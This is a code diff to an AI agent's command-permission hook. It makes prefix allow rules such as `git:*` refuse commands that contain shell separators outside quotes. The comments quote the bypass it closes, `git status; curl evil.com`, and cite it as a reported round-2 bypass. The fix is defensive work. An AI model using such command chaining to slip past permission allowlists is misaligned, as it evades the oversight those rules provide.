@@ -25,6 +25,11 @@
  * `git\push`. Hosts that want bulletproof matching should pair this
  * hook with the always-on hard floor in the executor itself.
  *
+ * `:*` boundary is whitespace-only. Shell separators (`;`, `&`, `|`,
+ * `<`, `>`) do NOT count as a boundary, so `"git:*"` does NOT match
+ * `git status; curl evil.com` — chained commands need their own rule.
+ * This is the safe default for allowlist postures.
+ *
  * Evaluation order (mirrors Claude Code's permission flow):
  *
  *   1. `deny` rule match → `'deny'`.
@@ -105,13 +110,61 @@ type CompiledMatcher = {
 };
 
 /**
+ * Quote-aware check for shell command-chaining metacharacters
+ * (`;`, `&`, `|`, `<`, `>`, backticks). Returns true if any of those
+ * appears OUTSIDE a quoted span — i.e. would actually be interpreted
+ * by bash as starting another command / redirecting / substituting.
+ * Inside `"…"` / `'…'` they are literal text.
+ *
+ * Used by prefix `:*` patterns to refuse any match on commands that
+ * contain chaining, so an allow rule like `git:*` doesn't
+ * accidentally authorize `git status; curl evil.com` — the prefix
+ * matches the first token but bash still runs the trailing command
+ * (Codex P1 round-2 bypass).
+ */
+function containsShellSeparator(command: string): boolean {
+  let quote: '"' | '\'' | '`' | undefined;
+  let escaped = false;
+  for (let i = 0; i < command.length; i++) {
+    const char = command[i];
+    if (escaped) {
+      escaped = false;
+      continue;
+    }
+    if (char === '\\') {
+      escaped = true;
+      continue;
+    }
+    if (quote != null) {
+      if (char === quote) quote = undefined;
+      continue;
+    }
+    if (char === '"' || char === '\'') {
+      quote = char;
+      continue;
+    }
+    if (
+      char === ';' ||
+      char === '&' ||
+      char === '|' ||
+      char === '<' ||
+      char === '>' ||
+      char === '`'
+    ) {
+      return true;
+    }
+  }
+  return false;
+}
+
+/**
  * Compile a single DSL pattern. Three forms:
  *   - `*`         → matches anything.
  *   - `<x>:*`     → prefix match; trims trailing `:*` and matches
- *                   when the trimmed command starts with the prefix.
- *                   Boundary-aware: `"git:*"` does NOT match `gitlab
- *                   clone`, because the next char after `git` must be
- *                   whitespace, end-of-string, or a shell separator.
+ *                   when the trimmed command starts with the prefix
+ *                   followed by whitespace or end-of-string, AND the
+ *                   command contains no shell separators (so the rule
+ *                   can't accidentally authorize chained commands).
  *   - `<x>`       — exact match on the trimmed command (after collapsing
  *                   inner whitespace runs).
  */
@@ -125,11 +178,17 @@ function compilePattern(pattern: string): CompiledMatcher {
     return {
       source,
       test: (command: string): boolean => {
+        // Refuse to match any command containing a shell separator
+        // (outside quotes). `git:*` matching `git status; curl evil`
+        // would let bash run the trailing command unauthorized
+        // (Codex P1 round-2). Hosts that want to allow chains must
+        // write rules for each segment, or use exact-match patterns.
+        if (containsShellSeparator(command)) return false;
         if (!command.startsWith(prefix)) return false;
         if (command.length === prefix.length) return true;
         const next = command.charAt(prefix.length);
-        // Boundary chars: whitespace or shell-statement separators.
-        return /[\s;&|<>]/.test(next);
+        // Boundary char must be whitespace; `gitlab` doesn't match `git:*`.
+        return /\s/.test(next);
       },
     };
   }
